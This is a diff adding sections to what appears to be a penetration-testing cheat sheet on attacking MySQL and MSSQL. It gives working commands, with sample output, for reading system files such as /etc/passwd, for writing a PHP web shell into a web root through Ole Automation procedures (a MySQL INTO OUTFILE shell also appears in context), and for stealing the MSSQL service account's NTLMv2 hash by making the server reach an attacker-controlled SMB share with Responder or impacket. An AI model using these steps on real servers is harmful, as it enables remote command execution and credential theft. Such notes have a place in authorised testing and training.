@@ -1538,6 +1538,52 @@ For example, if **MySQL** is running alongside a PHP-based web server (or anothe
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
+---
+
+In MySQL, the global system variable `secure_file_priv` restricts data import and export operations, including those performed by **LOAD DATA**, **SELECT … INTO OUTFILE**, and the **LOAD_FILE()** function. These operations are only available to users with the **FILE** privilege.
+
+`secure_file_priv` can be configured as follows:
+* **Empty value** → No restrictions are applied. This is considered insecure.
+* **Directory path** → Restricts import and export operations to that specific directory. The directory must already exist, as MySQL will not create it.
+* **NULL** → Completely disables import and export operations.
+
+**Verify `secure_file_priv`**
+
+```sql
+show variables like "secure_file_priv";
+```
+```bash
+# +------------------+-------+
+# | Variable_name    | Value |
+# +------------------+-------+
+# | secure_file_priv |       |
+# +------------------+-------+
+
+# 1 row in set (0.005 sec)
+```
+
+In the previous example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using MySQL.
+
+---
+
+By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges.
+
+**Read Local Files**
+
+```sql
+select LOAD_FILE("/etc/passwd");
+```
+```bash
+# +--------------------------+
+# | LOAD_FILE("/etc/passwd")
+# +--------------------------------------------------+
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+# sys:x:3:3:sys:/dev:/usr/sbin/nologin
+# sync:x:4:65534:sync:/bin:/bin/sync
+```
+
 </details>
 
 </details>
@@ -1665,7 +1711,7 @@ GO
 # (2 rows affected)
 ```
 
-If xp_cmdshell is not enabled, we can enable it.
+If `xp_cmdshell` is not enabled, we can enable it.
 
 **Allow advanced options to be changed:**
 
@@ -1694,6 +1740,137 @@ GO
 RECONFIGURE
 GO
 ```
+
+---
+
+To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+
+**Enable Ole Automation Procedures:**
+
+```sql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+
+**Write Local Files:**
+
+```sql
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+
+---
+
+**Read Local Files:**
+
+By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
+
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
+```
+```bash
+# BulkColumn
+
+# -----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
+
+# (1 rows affected)
+```
+
+</details>
+
+<details>
+<summary><h4>Step 4: Capture Service Hash</h4></summary>
+
+We can capture the MSSQL service account hash by abusing the undocumented stored procedures `xp_subdirs` or `vxp_dirtree`. These procedures rely on the SMB protocol to enumerate child directories under a specified parent directory. By directing the procedure to query a path hosted on our controlled SMB server, SQL Server is tricked into authenticating to it. This forces the service account to send its NTLMv2 hash, which can then be intercepted and cracked offline.
+
+**XP_DIRTREE Hash Stealing**
+
+```sql
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+GO
+```
+```bash
+# subdirectory    depth
+# --------------- -----------
+```
+
+**XP_SUBDIRS Hash Stealing**
+
+```sql
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+```
+```bash
+# HResult 0x55F6, Level 16, State 1
+# xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
+```
+
+If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
+
+**XP_SUBDIRS Hash Stealing with Responder**
+
+```bash
+sudo responder -I tun0
+```
+```bash
+#                                          __               
+#   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+#   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+#   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+#                    |__|              
+# <SNIP>
+
+# [+] Listening for events...
+
+# [SMB] NTLMv2-SSP Client   : 10.10.110.17
+# [SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+# [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:<NTLM_HASH>:<BLOB>
+```
+
+**XP_SUBDIRS Hash Stealing with Responder**
+
+```bash
+sudo impacket-smbserver share ./ -smb2support
+```
+```bash
+# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+# [*] Config file parsed
+# [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+# [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+# [*] Config file parsed                                                 
+# [*] Config file parsed                                                 
+# [*] Config file parsed
+# [*] Incoming connection (10.129.203.7,49728)
+# [*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+# [*] User WINSRV02\mssqlsvc authenticated successfully                        
+# [*] demouser::WIN7BOX:5e3ab1c4380b94a1:<NTLM_HASH>:<BLOB>
+# [*] Closing down connection (10.129.203.7,49728)                      
+# [*] Remaining connections []
+```
+
+</details>
+
+<details>
+<summary><h4>Step 5: Impersonate Existing Users</h4></summary>
 
 </details>
 
